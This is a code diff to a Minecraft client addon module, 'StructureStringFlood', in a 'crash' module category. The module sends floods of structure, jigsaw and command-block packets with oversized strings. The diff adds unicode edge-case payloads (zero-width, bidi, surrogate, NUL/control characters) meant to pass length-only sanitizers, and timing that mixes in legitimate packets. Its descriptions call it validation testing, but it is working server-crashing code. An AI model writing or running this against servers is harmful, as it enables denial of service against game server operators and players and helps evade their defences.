@@ -2,6 +2,7 @@ package com.example.addon.modules.crash;
 
 import com.example.addon.AddonTemplate;
 import meteordevelopment.meteorclient.events.game.GameLeftEvent;
+import meteordevelopment.meteorclient.events.packets.PacketEvent;
 import meteordevelopment.meteorclient.events.world.TickEvent;
 import meteordevelopment.meteorclient.settings.*;
 import meteordevelopment.meteorclient.systems.modules.Module;
@@ -40,12 +41,18 @@ import net.minecraft.util.math.Vec3i;
  */
 public class StructureStringFlood extends Module {
     public enum Target { STRUCTURE, JIGSAW, COMMAND_BLOCK, ALL }
+    public enum Content { FILLER, ZERO_WIDTH, BIDI, COMBINING, SURROGATES, NUL_CTRL, MIXED }
 
     private final SettingGroup sgGeneral = this.settings.getDefaultGroup();
 
     private final Setting<Target> target = sgGeneral.add(new EnumSetting.Builder<Target>()
         .name("target").description("Which packet's string fields to flood.")
         .defaultValue(Target.ALL).build()
+    );
+    private final Setting<Content> content = sgGeneral.add(new EnumSetting.Builder<Content>()
+        .name("content")
+        .description("FILLER = plain chars (length test). The rest are content edge cases that pass a length-only sanitizer.")
+        .defaultValue(Content.FILLER).build()
     );
     private final Setting<Integer> length = sgGeneral.add(new IntSetting.Builder()
         .name("string-length").description("Characters in each oversized string field.")
@@ -55,6 +62,11 @@ public class StructureStringFlood extends Module {
         .name("packets-per-tick").description("Packets sent each tick.")
         .defaultValue(20).min(1).sliderMax(500).build()
     );
+
+    private final TestCadence cadence = new TestCadence(sgGeneral);
+    private final PreStress preStress = new PreStress(sgGeneral);
+    private final GracefulResponse gr = new GracefulResponse(sgGeneral);
+
     private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
         .name("auto-disable").description("Disable when kicked from the server.")
         .defaultValue(true).build()
@@ -68,20 +80,27 @@ public class StructureStringFlood extends Module {
 
     public StructureStringFlood() {
         super(AddonTemplate.CRASH_CATEGORY, "structure-string-flood",
-            "Floods structure/jigsaw/command-block packets with oversized string fields. Tests string length validation.");
+            "Floods structure/jigsaw/command-block packets with oversized or unicode-edge string fields. Tests string length + content validation.");
     }
 
     private String bigString() {
-        return "A".repeat(length.get());
+        return content.get() == Content.FILLER
+            ? "A".repeat(length.get())
+            : NastyText.build(NastyText.Kind.valueOf(content.get().name()), length.get());
     }
 
     @Override
-    public void onActivate() { ticksActive = 0; packetsSent = 0; }
+    public void onActivate() {
+        ticksActive = 0; packetsSent = 0;
+        cadence.onActivate(); gr.onActivate(); preStress.onActivate(this);
+    }
 
     @EventHandler
     private void onTick(TickEvent.Pre event) {
         if (mc.player == null) return;
         ticksActive++;
+        gr.tick();
+        if (!cadence.shouldFire()) return;
         BlockPos pos = mc.player.getBlockPos();
         String big = bigString();
 
@@ -93,6 +112,8 @@ public class StructureStringFlood extends Module {
                 case ALL -> { sendStructure(pos, big); sendJigsaw(pos, big); sendCommandBlock(pos, big); }
             }
         }
+        gr.markFired();
+        TestCadence.sendLegit(mc.player, cadence.legitRatio());
     }
 
     private void sendStructure(BlockPos pos, String big) {
@@ -119,11 +140,19 @@ public class StructureStringFlood extends Module {
 
     @Override
     public void onDeactivate() {
-        if (showStats.get()) info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
+        if (showStats.get()) {
+            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
+            gr.report(l -> info("%s", l));
+        }
+        preStress.onDeactivate();
     }
 
     @EventHandler
+    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }
+
+    @EventHandler
     private void onGameLeft(GameLeftEvent event) {
+        gr.onKick();
         if (autoDisable.get() && isActive()) toggle();
     }
 }
